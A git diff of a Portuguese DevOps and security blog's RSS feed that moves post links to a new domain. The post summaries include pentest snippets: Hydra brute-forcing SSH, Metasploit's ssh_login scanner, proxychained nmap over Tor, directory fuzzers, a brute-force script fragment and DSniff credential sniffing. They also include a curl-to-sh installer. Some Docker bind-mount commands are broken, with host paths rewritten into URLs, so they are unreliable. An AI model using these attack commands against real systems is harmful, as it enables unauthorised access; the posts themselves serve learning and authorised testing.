@@ -2,24 +2,24 @@
   <channel>
     <docs>https://blogs.law.harvard.edu/tech/rss</docs>
     <title>FXShell - DevOps &amp; Sec</title>
-    <link>https://fxshelll.github.io/posts/</link>
+    <link>https://fxshell.com.br/posts/</link>
     <description>Recent content on FXShell - DevOps &amp; Sec</description>
     <image>
       <title>FXShell - DevOps &amp; Sec</title>
-      <link>https://fxshelll.github.io/posts/</link>
+      <link>https://fxshell.com.br/posts/</link>
       <url>fxshell.png</url>
     </image>
     <ttl>1440</ttl>
     <generator>Hugo 0.152.2</generator>
     <language>pt-br</language>
-    <lastBuildDate>Sun, 10 May 2026 05:14:34 UT</lastBuildDate>
-    <atom:link href="https://fxshelll.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 14 May 2026 18:24:20 UT</lastBuildDate>
+    <atom:link href="https://fxshell.com.br/posts/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Migração S3 - Azure Blob Storage com Ansible e Azure Data Factory</title>
-      <link>https://fxshelll.github.io/posts/ansible-adf-migrate-s3-azure/</link>
+      <link>https://fxshell.com.br/posts/ansible-adf-migrate-s3-azure/</link>
       <pubDate>Fri, 08 May 2026 00:00:00 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/ansible-adf-migrate-s3-azure/</guid>
+      <guid>https://fxshell.com.br/posts/ansible-adf-migrate-s3-azure/</guid>
       <description>Em um projeto de migração real, precisamos mover os dados de dezenas de buckets S3 de clientes para o Azure Blob Storage. O processo manual - criar o ADF no portal, configurar cada linked service, montar a pipeline, disparar e monitorar - era repetitivo e propenso a erro. A solução foi um único playbook Ansible que provisiona toda a infraestrutura e executa a cópia de ponta a ponta.
 Objetivo do Lab Construir um playbook Ansible que automatiza completamente a migração de dados de um bucket AWS S3 para um container no Azure Blob Storage, usando o Azure Data Factory como motor de cópia. O playbook cria todos os recursos necessários, dispara a pipeline e faz polling do status até confirmar o sucesso (ou falha explícita).
 </description>
@@ -53,10 +53,10 @@ Referências Azure Data Factory - documentação oficial Copiar dados do Amazon 
     </item>
     <item>
       <title>Ansible SSL: Certificados Let&#39;s Encrypt Automáticos com AWX</title>
-      <link>https://fxshelll.github.io/posts/ansible-ssl-letsencrypt/</link>
+      <link>https://fxshell.com.br/posts/ansible-ssl-letsencrypt/</link>
       <pubDate>Sun, 03 May 2026 13:00:00 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/ansible-ssl-letsencrypt/</guid>
+      <guid>https://fxshell.com.br/posts/ansible-ssl-letsencrypt/</guid>
       <description>Você já acordou às 3 da manhã com o alerta de que um certificado SSL expirou em produção? Ou descobriu que um cliente tentou acessar o site e viu a tela vermelha do browser dizendo &ldquo;conexão não é segura&rdquo;? Esse é o custo de gerenciar SSL na mão.
 Neste lab eu automatizei o ciclo completo de criação e renovação de certificados SSL para três sites diferentes — fxshell1.com.br, fxshell2.com.br e fxshell3.com.br — usando Ansible + Certbot + Let&rsquo;s Encrypt. Cada certificado cobre o domínio raiz e o www no mesmo cert (SAN). O AWX agenda a renovação automática toda terça-feira às 03:00 UTC; quando disparado manualmente, um survey pergunta quais tenants renovar antes de executar. Nenhum clique desnecessário, nenhuma surpresa.
 </description>
@@ -95,10 +95,10 @@ Referências Certbot Documentation Let&rsquo;s Encrypt — Rate Limits ACME Prot
     </item>
     <item>
       <title>Application Gateway no Azure com Terraform — Lab de Backend API com Path Routing</title>
-      <link>https://fxshelll.github.io/posts/terraform-azure-appgw/</link>
+      <link>https://fxshell.com.br/posts/terraform-azure-appgw/</link>
       <pubDate>Sat, 25 Apr 2026 00:00:00 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/terraform-azure-appgw/</guid>
+      <guid>https://fxshell.com.br/posts/terraform-azure-appgw/</guid>
       <description>Se a sua aplicação expõe múltiplas APIs numa mesma infraestrutura e você precisa rotear o tráfego por URL — /api/orders para um pool, /api/inventory para outro — um Load Balancer tradicional não resolve. Ele opera na camada 4 (TCP/UDP), enxerga apenas IP e porta, e distribui conexões sem entender o conteúdo HTTP. O Azure Application Gateway opera na camada 7 e faz exatamente esse roteamento baseado em path, header e host — além de oferecer SSL termination, health probes HTTP e integração com WAF.
 </description>
       <content:encoded><![CDATA[Se a sua aplicação expõe múltiplas APIs numa mesma infraestrutura e você precisa rotear o tráfego por URL — /api/orders para um pool, /api/inventory para outro — um Load Balancer tradicional não resolve. Ele opera na camada 4 (TCP/UDP), enxerga apenas IP e porta, e distribui conexões sem entender o conteúdo HTTP. O Azure Application Gateway opera na camada 7 e faz exatamente esse roteamento baseado em path, header e host — além de oferecer SSL termination, health probes HTTP e integração com WAF.
@@ -137,10 +137,10 @@ Referências Azure Application Gateway — Documentação oficial URL path-based
     </item>
     <item>
       <title>Ansible Lab: Provisionando Infraestrutura Web Segura do Zero</title>
-      <link>https://fxshelll.github.io/posts/ansible-lab-infra-segura/</link>
+      <link>https://fxshell.com.br/posts/ansible-lab-infra-segura/</link>
       <pubDate>Tue, 21 Apr 2026 13:00:00 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/ansible-lab-infra-segura/</guid>
+      <guid>https://fxshell.com.br/posts/ansible-lab-infra-segura/</guid>
       <description>Cenário: você tem 4 VMs vazias e precisa subir uma stack web completa — load balancer, dois servidores de aplicação, banco de dados, tudo com segurança configurada desde o início — em menos de 5 minutos. Só com Ansible.
 Este post documenta um lab que montei para praticar exatamente isso: infraestrutura como código, do zero até uma stack funcional e segura, reproduzível com um único comando.
 Objetivo do Lab O objetivo é simular, localmente, um ambiente que existe de verdade em qualquer empresa que tenha um sistema web em produção. Em vez de provisionar um servidor por vez — conectando via SSH, instalando pacotes na mão e torcendo para não esquecer nada — o lab demonstra como automatizar todo esse processo com Ansible.
@@ -194,10 +194,10 @@ Documentação oficial do Ansible Ansible Galaxy CIS Benchmarks para Linux ]]></
     </item>
     <item>
       <title>Automatizando Backups de SQL Server no Azure com Ansible</title>
-      <link>https://fxshelll.github.io/posts/ansible-mssql-backup-azure/</link>
+      <link>https://fxshell.com.br/posts/ansible-mssql-backup-azure/</link>
       <pubDate>Tue, 21 Apr 2026 00:00:00 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/ansible-mssql-backup-azure/</guid>
+      <guid>https://fxshell.com.br/posts/ansible-mssql-backup-azure/</guid>
       <description>Manter backups consistentes de múltiplos SQL Servers e armazená-los em nuvem é uma tarefa crítica que, quando feita manualmente, vira fonte de erros, esquecimentos e surpresas na hora de um restore. Este lab mostra como resolver isso com Ansible rodando em uma máquina Linux, acionando servidores Windows via WinRM e fazendo o backup ir direto do SQL Server para o Azure Blob Storage — sem que nenhum arquivo passe pela máquina de controle.
 </description>
       <content:encoded><![CDATA[Manter backups consistentes de múltiplos SQL Servers e armazená-los em nuvem é uma tarefa crítica que, quando feita manualmente, vira fonte de erros, esquecimentos e surpresas na hora de um restore. Este lab mostra como resolver isso com Ansible rodando em uma máquina Linux, acionando servidores Windows via WinRM e fazendo o backup ir direto do SQL Server para o Azure Blob Storage — sem que nenhum arquivo passe pela máquina de controle.
@@ -249,10 +249,10 @@ Referências Documentação do Ansible para Windows BACKUP TO URL — SQL Server
     </item>
     <item>
       <title>Terraform AWS — Provisionando uma VPC Segura com ALB, EC2 e RDS</title>
-      <link>https://fxshelll.github.io/posts/terraform-aws-vpc/</link>
+      <link>https://fxshell.com.br/posts/terraform-aws-vpc/</link>
       <pubDate>Tue, 21 Apr 2026 00:00:00 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/terraform-aws-vpc/</guid>
+      <guid>https://fxshell.com.br/posts/terraform-aws-vpc/</guid>
       <description>Toda vez que um time precisa criar um novo ambiente — seja para testes, staging ou produção — o processo manual de clicar no console da AWS abre espaço para erros, inconsistências e ambientes que ninguém sabe exatamente como foram configurados. Infraestrutura como Código resolve isso: você escreve a infraestrutura em arquivos de texto, versiona no Git e aplica com um comando.
 Neste lab, construo uma VPC completa na AWS usando Terraform, com balanceador de carga, servidores web em subnets privadas, banco de dados MySQL e state remoto no S3.
 </description>
@@ -286,10 +286,10 @@ Referências Terraform AWS Provider Docs AWS VPC User Guide Terraform Best Pract
     </item>
     <item>
       <title>Seu terminal pode ser muito mais produtivo com Zsh</title>
-      <link>https://fxshelll.github.io/posts/zsh-terminal-produtivo/</link>
+      <link>https://fxshell.com.br/posts/zsh-terminal-produtivo/</link>
       <pubDate>Mon, 30 Mar 2026 03:00:00 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/zsh-terminal-produtivo/</guid>
+      <guid>https://fxshell.com.br/posts/zsh-terminal-produtivo/</guid>
       <description>Se você passa boa parte do dia no terminal, vale muito a pena investir alguns minutos configurando o Zsh com Oh My Zsh. A diferença na produtividade é real — autocomplete inteligente, highlight de sintaxe, histórico gigante e plugins que evitam você digitar a mesma coisa mil vezes.
 Esse post é baseado na minha configuração pessoal do .zshrc. Bora ver o que tem dentro.
 Instalando o Zsh e Oh My Zsh # Instalar o Zsh (Debian/Ubuntu) sudo apt install zsh # Definir como shell padrão chsh -s $(which zsh) # Instalar o Oh My Zsh sh -c &#34;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&#34; Tema O tema padrão que uso é o robbyrussell — simples, limpo e mostra o branch do git direto no prompt.
@@ -311,10 +311,10 @@ Meu .zshrc completo export ZSH=&#34;$HOME/.oh-my-zsh&#34; ZSH_THEME=&#34;robbyru
     </item>
     <item>
       <title>Monolito, Arquitetura em Camadas e Microsserviços</title>
-      <link>https://fxshelll.github.io/posts/arquitetura-de-aplica%C3%A7%C3%B5es/</link>
+      <link>https://fxshell.com.br/posts/arquitetura-de-aplica%C3%A7%C3%B5es/</link>
       <pubDate>Wed, 24 Sep 2025 12:00:00 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/arquitetura-de-aplica%C3%A7%C3%B5es/</guid>
+      <guid>https://fxshell.com.br/posts/arquitetura-de-aplica%C3%A7%C3%B5es/</guid>
       <description>A maioria dos sistemas começa como um monólito. E não tem problema algum nisso. O problema é quando o monólito cresce sem nenhuma organização interna, e o time começa a gastar mais tempo desvendando dependências ocultas do que entregando funcionalidades.
 Este post cobre a evolução natural das arquiteturas de software — do monólito para a arquitetura em camadas e, em determinados contextos, para microsserviços — com ênfase nos trade-offs reais de cada abordagem.
 </description>
@@ -356,10 +356,10 @@ Referências Martin Fowler — Microservices Martin Fowler — Strangler Fig App
     </item>
     <item>
       <title>Ansible</title>
-      <link>https://fxshelll.github.io/posts/ansible/</link>
+      <link>https://fxshell.com.br/posts/ansible/</link>
       <pubDate>Tue, 30 Mar 2021 00:56:17 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/ansible/</guid>
+      <guid>https://fxshell.com.br/posts/ansible/</guid>
       <description>O Ansible é uma ferramenta de automação de infraestrutura open source que permite gerenciar configurações, provisionar servidores e orquestrar tarefas complexas em dezenas ou centenas de máquinas ao mesmo tempo — tudo a partir de um único ponto de controle, sem instalar nenhum agente nos servidores alvo.
 O nome vem da ficção científica: um &ldquo;ansible&rdquo; é um dispositivo de comunicação superlumínica que transmite informação instantaneamente para múltiplos destinos. A metáfora é precisa.
 </description>
@@ -417,10 +417,10 @@ Criar playbooks completos que provisionam stacks inteiras Organizar infraestrutu
     </item>
     <item>
       <title>Redhat RH124</title>
-      <link>https://fxshelll.github.io/posts/redhat-rh124/</link>
+      <link>https://fxshell.com.br/posts/redhat-rh124/</link>
       <pubDate>Wed, 17 Mar 2021 02:03:55 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/redhat-rh124/</guid>
+      <guid>https://fxshell.com.br/posts/redhat-rh124/</guid>
       <description>
 Red Hat System Administration I O curso Red Hat System Administration I (RH124) foi desenvolvido para profissionais de TI sem experiência anterior em administração de sistemas Linux. O recurso tem como objetivo fornecer aos alunos &ldquo;habilidades de sobrevivência&rdquo; de administração do Linux, com foco em tarefas centrais de administração. O Red Hat System Administration I também oferece uma base para os alunos que planejam se tornar administradores de sistemas Linux em tempo integral, apresentando os principais conceitos de linha de comando e ferramentas de nível corporativo. Esses conceitos serão mais desenvolvidos no próximo curso, Red Hat System Administration II (RH134).
 </description>
@@ -2316,10 +2316,10 @@ Ativar a interface de gerenciamento do console da web para gerenciar e monitorar
     </item>
     <item>
       <title>Proxychain</title>
-      <link>https://fxshelll.github.io/posts/proxychain/</link>
+      <link>https://fxshell.com.br/posts/proxychain/</link>
       <pubDate>Wed, 03 Feb 2021 14:49:14 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/proxychain/</guid>
+      <guid>https://fxshell.com.br/posts/proxychain/</guid>
       <description>O ProxyChains é um programa que trabalha em base UNIX, que conecta funções relacionadas à rede em programas vinculados dinamicamente por meio de uma DLL pré-carregada e redireciona as conexões por meio de proxies SOCKS4 e SOCKS5 ou HTTP.
 Ao invés de realizar o roteamento para uma lista específica de proxies, podemos usar o Tor e redirecionar as requisições diretamente para a porta do Tor. Ou seja, realizamos varreduras diretamente pela rede Tor.
 </description>
@@ -2344,10 +2344,10 @@ Realizando uma varredura via Proxychains root@kali:~#: proxychains nmap -sC -sS 
     </item>
     <item>
       <title>Docker</title>
-      <link>https://fxshelll.github.io/posts/docker/</link>
+      <link>https://fxshell.com.br/posts/docker/</link>
       <pubDate>Thu, 08 Oct 2020 14:10:44 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/docker/</guid>
+      <guid>https://fxshell.com.br/posts/docker/</guid>
       <description>Docker é a plataforma de containers mais usada no mercado. Com ela você empacota uma aplicação e todas as suas dependências em uma unidade portátil que roda de forma idêntica em qualquer ambiente — do laptop do dev até a produção em cloud.
 O conceito central é isolamento: cada container roda de forma completamente isolada dos demais e do host, usando recursos do próprio kernel Linux.
 Dois tipos de isolamento Lógico — Namespaces: isolam processos, redes, usuários e sistemas de arquivos. Cada container enxerga apenas o que é seu.
@@ -2366,9 +2366,9 @@ docker container exec -ti &lt;id&gt; bash docker container exec -ti &lt;id&gt; l
 docker container run -d -m 128M --cpus 0.5 nginx Atualizar em container já em execução:
 docker container update --cpus 0.8 --memory 64M &lt;id&gt; Testar pressão com stress (instalar dentro do container):
 apt-get install -y stress stress --cpu 1 --vm-bytes 128M --vm 1 Volumes — Persistindo Dados O filesystem do container é volátil — quando o container é removido, tudo dentro dele some. Volumes existem fora do container e persistem independentemente.
-Bind Mount — você define o caminho # Montar diretório do host no container docker container run -ti \ --mount type=bind,src=https://fxshelll.github.io/opt/meuapp,dst=/app \ debian # Somente leitura docker container run -ti \ --mount type=bind,src=https://fxshelll.github.io/opt/meuapp,dst=/app,ro \ debian Docker Volume — gerenciado pelo Docker # Criar volume docker volume create dbdados # Usar volume no container docker container run -d \ --mount type=volume,src=dbdados,dst=/data \ postgres:16 # Listar volumes docker volume ls # Inspecionar docker volume inspect dbdados # Remover (só se não estiver em uso) docker volume rm dbdados # Remover todos os volumes não utilizados docker volume prune Todos os volumes ficam em /var/lib/docker/volumes/.
+Bind Mount — você define o caminho # Montar diretório do host no container docker container run -ti \ --mount type=bind,src=https://fxshell.com.br/opt/meuapp,dst=/app \ debian # Somente leitura docker container run -ti \ --mount type=bind,src=https://fxshell.com.br/opt/meuapp,dst=/app,ro \ debian Docker Volume — gerenciado pelo Docker # Criar volume docker volume create dbdados # Usar volume no container docker container run -d \ --mount type=volume,src=dbdados,dst=/data \ postgres:16 # Listar volumes docker volume ls # Inspecionar docker volume inspect dbdados # Remover (só se não estiver em uso) docker volume rm dbdados # Remover todos os volumes não utilizados docker volume prune Todos os volumes ficam em /var/lib/docker/volumes/.
 Compartilhando volume entre containers docker container run -d -p 5432:5432 --name pgsql1 \ --mount type=volume,src=dbdados,dst=/data \ postgres:16 docker container run -d -p 5433:5432 --name pgsql2 \ --mount type=volume,src=dbdados,dst=/data \ postgres:16 Ambos os containers leem e escrevem no mesmo volume.
-Backup de volume mkdir /opt/backup docker container run --rm \ --mount type=volume,src=dbdados,dst=/data \ --mount type=bind,src=https://fxshelll.github.io/opt/backup,dst=/backup \ debian tar -cvf /backup/bkp-banco.tar /data Dockerfile — Criando Suas Imagens O Dockerfile descreve como construir uma imagem. Cada instrução cria uma nova camada.
+Backup de volume mkdir /opt/backup docker container run --rm \ --mount type=volume,src=dbdados,dst=/data \ --mount type=bind,src=https://fxshell.com.br/opt/backup,dst=/backup \ debian tar -cvf /backup/bkp-banco.tar /data Dockerfile — Criando Suas Imagens O Dockerfile descreve como construir uma imagem. Cada instrução cria uma nova camada.
 Instruções principais Instrução Descrição FROM Imagem base — sempre a primeira linha RUN Executa comando no build, cria camada CMD Comando padrão ao iniciar o container ENTRYPOINT Executável principal do container COPY Copia arquivos para o filesystem ADD Como COPY, mas aceita TAR e URLs ENV Define variáveis de ambiente EXPOSE Documenta a porta que o container escuta VOLUME Declara ponto de montagem de volume WORKDIR Define diretório de trabalho USER Define usuário (padrão: root) LABEL Adiciona metadados à imagem ARG Variável de build-time (não fica na imagem) Exemplo: container com stress FROM debian LABEL app=&#34;stress-test&#34; ENV AMBIENTE=&#34;dev&#34; RUN apt-get update &amp;&amp; apt-get install -y stress &amp;&amp; apt-get clean CMD stress --cpu 1 --vm-bytes 64M --vm 1 docker image build -t meu-stress:1.0 . docker container run -d meu-stress:1.0 Exemplo: Apache com ENTRYPOINT FROM debian RUN apt-get update &amp;&amp; apt-get install -y apache2 &amp;&amp; apt-get clean ENV APACHE_LOCK_DIR=&#34;/var/lock&#34; ENV APACHE_PID_FILE=&#34;/var/run/apache2/apache2.pid&#34; ENV APACHE_RUN_USER=&#34;www-data&#34; ENV APACHE_RUN_GROUP=&#34;www-data&#34; ENV APACHE_LOG_DIR=&#34;/var/log/apache2&#34; LABEL description=&#34;Webserver&#34; version=&#34;1.0.0&#34; VOLUME /var/www/html/ EXPOSE 80 ENTRYPOINT [&#34;/usr/sbin/apachectl&#34;] CMD [&#34;-D&#34;, &#34;FOREGROUND&#34;] Multi-stage build — imagem final mínima Compila em uma imagem pesada, copia apenas o binário para uma imagem leve:
 # Stage 1: build FROM golang AS build WORKDIR /src ADD . /src RUN go build -o goapp # Stage 2: imagem final FROM alpine:3.19 WORKDIR /app COPY --from=build /src/goapp /app ENTRYPOINT [&#34;./goapp&#34;] A imagem final tem apenas o binário + Alpine (~5 MB), sem o toolchain Go.
 Buildar e publicar # Build local docker image build -t minha-imagem:1.0 . # Ver camadas e histórico docker history minha-imagem:1.0 # Login no Docker Hub docker login # Push docker image tag minha-imagem:1.0 usuario/minha-imagem:1.0 docker push usuario/minha-imagem:1.0 Registry Local Para manter suas imagens em ambiente privado sem depender do Docker Hub:
@@ -2382,10 +2382,10 @@ Limpeza # Remover containers parados docker container prune # Remover volumes n�
     </item>
     <item>
       <title>DSniff</title>
-      <link>https://fxshelll.github.io/posts/dsniff/</link>
+      <link>https://fxshell.com.br/posts/dsniff/</link>
       <pubDate>Wed, 30 Sep 2020 23:59:51 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/dsniff/</guid>
+      <guid>https://fxshell.com.br/posts/dsniff/</guid>
       <description>O DSniff é um conjunto de ferramentas para auditoria de redes, que também poderá ser útil para aplicações forenses. Algumas das principais ferramentas dessa suíte são:
 DSniff: sniffer de senhas que suporta os protocolos FTP, Telnet, SMTP, HTTP e POP, dentre muitos outros. Filesnarf: ferramenta para extração de arquivos trafegados pelo protocolo NFS. Mailsnarf: ferramenta para extração de e-mails trafegados pelos protocolos SMTP e POP. DNSspoof: ferramenta para envio de respostas falsas a requisições DNS, auxiliando em ataques MITM. SSHmitm: ferramenta para execução de ataques MITM em conexões SSH (versão 1, exclusivamente), permitindo a captura de senhas e sequestro da sessão. </description>
       <content:encoded><![CDATA[O DSniff é um conjunto de ferramentas para auditoria de redes, que também poderá ser útil para aplicações forenses. Algumas das principais ferramentas dessa suíte são:
@@ -2393,10 +2393,10 @@ DSniff: sniffer de senhas que suporta os protocolos FTP, Telnet, SMTP, HTTP e PO
     </item>
     <item>
       <title>Kubernetes</title>
-      <link>https://fxshelll.github.io/posts/kubernetes/</link>
+      <link>https://fxshell.com.br/posts/kubernetes/</link>
       <pubDate>Wed, 30 Sep 2020 23:59:51 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/kubernetes/</guid>
+      <guid>https://fxshell.com.br/posts/kubernetes/</guid>
       <description>Introdução e Arquitetura do Kubernetes Começaremos explorando os fundamentos do Kubernetes — conceitos essenciais para construir uma base sólida que facilitará o entendimento da arquitetura e do funcionamento dessa plataforma de orquestração de contêineres.
 O que é Kubernetes? O Kubernetes é uma plataforma open source para orquestração de contêineres, criada para automatizar grande parte das tarefas manuais relacionadas a implantação, administração e escalonamento de aplicações em contêineres.
 Por que usar Kubernetes? Inicialmente criado pelo Google e atualmente mantido pela Cloud Native Computing Foundation (CNCF), o Kubernetes se consolidou como o padrão de mercado para orquestração de contêineres, sendo amplamente adotado em arquiteturas de microsserviços e computação em nuvem.
@@ -2468,10 +2468,10 @@ Aumentar limites de file descriptors; Otimizar configurações de timeout; Verif
     </item>
     <item>
       <title>Tcpdump</title>
-      <link>https://fxshelll.github.io/posts/tcpdump/</link>
+      <link>https://fxshell.com.br/posts/tcpdump/</link>
       <pubDate>Wed, 30 Sep 2020 23:58:47 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/tcpdump/</guid>
+      <guid>https://fxshell.com.br/posts/tcpdump/</guid>
       <description>O TCPDump funciona em linha de comando, para captura e análise de pacotes. Já vem instalado por padrão em diversas distribuições Linux, foi também portado para o Windows com o nome de Windump. O TCPDump provê uma interface de usuário para a interação com a LibPcap, biblioteca amplamente utilizada por sniffers open source, que atua diretamente no driver da placa de rede para possibilitar a captura de pacotes.
 # tcpdump
 </description>
@@ -2484,10 +2484,10 @@ Para fazer uma busca especifica por uma interface, wireless por exemplo, basta s
     </item>
     <item>
       <title>Ferramentas De Quebra De Senhas</title>
-      <link>https://fxshelll.github.io/posts/ferramentas-de-quebra-de-senhas/</link>
+      <link>https://fxshell.com.br/posts/ferramentas-de-quebra-de-senhas/</link>
       <pubDate>Wed, 30 Sep 2020 23:58:15 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/ferramentas-de-quebra-de-senhas/</guid>
+      <guid>https://fxshell.com.br/posts/ferramentas-de-quebra-de-senhas/</guid>
       <description>Hydra O Hydra é uma ferramenta famosa que realiza ataque de dicionário a serviços. Seu uso é, basicamente, assim:
 hydra -l &lt;login&gt; -p &lt;senha&gt; &lt;IP&gt; &lt;serviço&gt; -t &lt;tasks&gt; Abaixo, um exemplo de uma tentativa única (-t 1) com o usuário root (-l root) e a senha 12345 (-p 12345) no endereço 10.0.2.2 no serviço ssh:
 hydra -l root -p 12345 10.0.2.2 ssh -t 1 Podemos passar um dicionário de logins e senhas com o parâmetro -L e -P:
@@ -2516,19 +2516,19 @@ service postgresql start msfconsole use auxiliary/scanner/ssh/ssh_login # outros
     </item>
     <item>
       <title>Steghide</title>
-      <link>https://fxshelll.github.io/posts/steghide/</link>
+      <link>https://fxshell.com.br/posts/steghide/</link>
       <pubDate>Thu, 20 Aug 2020 02:23:34 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/steghide/</guid>
+      <guid>https://fxshell.com.br/posts/steghide/</guid>
       <description>$ sudo apt-get install steghide # Para embutir um arquivo de texto dentro de uma imagem steghide embed -cf picture.jpg -ef secret.txt # Para extrair o arquivo de dentro da imagem steghide extract -sf picture.jpg # Para exibir informações sobre o arquivo de imagem com o embed steghide info picture.jpg </description>
       <content:encoded><![CDATA[$ sudo apt-get install steghide # Para embutir um arquivo de texto dentro de uma imagem steghide embed -cf picture.jpg -ef secret.txt # Para extrair o arquivo de dentro da imagem steghide extract -sf picture.jpg # Para exibir informações sobre o arquivo de imagem com o embed steghide info picture.jpg ]]></content:encoded>
     </item>
     <item>
       <title>Wfuzz</title>
-      <link>https://fxshelll.github.io/posts/wfuzz/</link>
+      <link>https://fxshell.com.br/posts/wfuzz/</link>
       <pubDate>Fri, 31 Jul 2020 04:13:20 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/wfuzz/</guid>
+      <guid>https://fxshell.com.br/posts/wfuzz/</guid>
       <description>É uma ferramenta de fuzzing criada para facilitar a avaliação de aplicações web. Baseia-se num conceito simples: substitui qualquer referência à palavra-chave FUZZ pelo valor de um determinado payload. Um payload no Wfuzz é uma fonte de dados.
 wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 http://10.15.0.1/FUZZ -c colorir saída
 -w caminho da wordlist
@@ -2542,10 +2542,10 @@ wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 40
     </item>
     <item>
       <title>GoBuster</title>
-      <link>https://fxshelll.github.io/posts/gobuster/</link>
+      <link>https://fxshell.com.br/posts/gobuster/</link>
       <pubDate>Tue, 28 Jul 2020 02:44:29 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/gobuster/</guid>
+      <guid>https://fxshell.com.br/posts/gobuster/</guid>
       <description>GoBuster — primo do DIRB
 O GoBuster é uma ótima ferramenta utilizada para força bruta em URIs (diretórios e arquivos).
 -fw – força o processamento de um domínio com resultados curinga. -np – oculta a saída do progresso. -m &lt;modo&gt; – qual modo usar: dir ou dns (padrão: dir). -q – desativa a saída de banner/sublinhado. -t &lt;threads&gt; – número de threads a serem executadas (padrão: 10). -u &lt;url/domain&gt; – URL completo (incluindo esquema) ou nome de domínio base. -v – saída detalhada (mostra todos os resultados). -w &lt;wordlist&gt; – caminho para a wordlist usada na força bruta (use - para stdin). Eu poderia usar o DIRB? Sim, pois ele também faz o scanning de páginas. Ficaria assim:
@@ -2561,10 +2561,10 @@ Flags mais usadas:
     </item>
     <item>
       <title>FIAP - DevOps e Arquitetura Cloud</title>
-      <link>https://fxshelll.github.io/posts/devops-e-arquitetura-cloud/</link>
+      <link>https://fxshell.com.br/posts/devops-e-arquitetura-cloud/</link>
       <pubDate>Thu, 23 Jul 2020 02:58:13 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/devops-e-arquitetura-cloud/</guid>
+      <guid>https://fxshell.com.br/posts/devops-e-arquitetura-cloud/</guid>
       <description>Fundamentos da Cultura DevOps O DevOps surgiu para acabar com o conflito entre desenvolvimento, focado em inovação rápida, e operações, voltadas para estabilidade e segurança. Em vez de atuarem separadamente, as duas áreas passaram a se integrar em um único fluxo colaborativo. Mais do que um conjunto de ferramentas, o DevOps representa uma mudança cultural que promove colaboração constante entre pessoas e times, automação de tarefas repetitivas — como testes, deploys e integrações —, monitoramento contínuo das aplicações e feedback rápido para melhorias constantes.
 </description>
       <content:encoded><![CDATA[Fundamentos da Cultura DevOps O DevOps surgiu para acabar com o conflito entre desenvolvimento, focado em inovação rápida, e operações, voltadas para estabilidade e segurança. Em vez de atuarem separadamente, as duas áreas passaram a se integrar em um único fluxo colaborativo. Mais do que um conjunto de ferramentas, o DevOps representa uma mudança cultural que promove colaboração constante entre pessoas e times, automação de tarefas repetitivas — como testes, deploys e integrações —, monitoramento contínuo das aplicações e feedback rápido para melhorias constantes.
@@ -2677,10 +2677,10 @@ O resultado é um ambiente seguro, eficiente e resiliente, que entrega valor rá
     </item>
     <item>
       <title>Wordlist com Palavras do Site</title>
-      <link>https://fxshelll.github.io/posts/wordlist/</link>
+      <link>https://fxshell.com.br/posts/wordlist/</link>
       <pubDate>Thu, 23 Jul 2020 02:58:13 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/wordlist/</guid>
+      <guid>https://fxshell.com.br/posts/wordlist/</guid>
       <description>Gerando wordlist com palavras do site cewl -w wordlists.txt -d 10 -m 1 http://seualvo.com/
 Crie o arquivo brute.py Para executá-lo basta rodar o comando:
 $ python3 brute.py
@@ -2692,10 +2692,10 @@ import re import requests def open_ressources(file_path): return [item.replace(&
     </item>
     <item>
       <title>Dirsearch</title>
-      <link>https://fxshelll.github.io/posts/dirsearch/</link>
+      <link>https://fxshell.com.br/posts/dirsearch/</link>
       <pubDate>Thu, 23 Jul 2020 02:37:57 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/dirsearch/</guid>
+      <guid>https://fxshell.com.br/posts/dirsearch/</guid>
       <description>DIRSEARCH https://github.com/maurosoria/dirsearch
 O dirsearch é uma ferramenta simples de linha de comando projetada para força bruta em diretórios e arquivos de sites.
 Particularmente prefiro ele ao DIRB ou GoBuster — já obtive mais resultados com ele. Vou escrever sobre essas outras ferramentas também.
@@ -2711,10 +2711,10 @@ _|. _ _ _ _ _ _|_ v0.3.9 (_||| _) (/_(_|| (_| ) Extensions: | HTTP method: getSu
     </item>
     <item>
       <title>sh_MSFvenom</title>
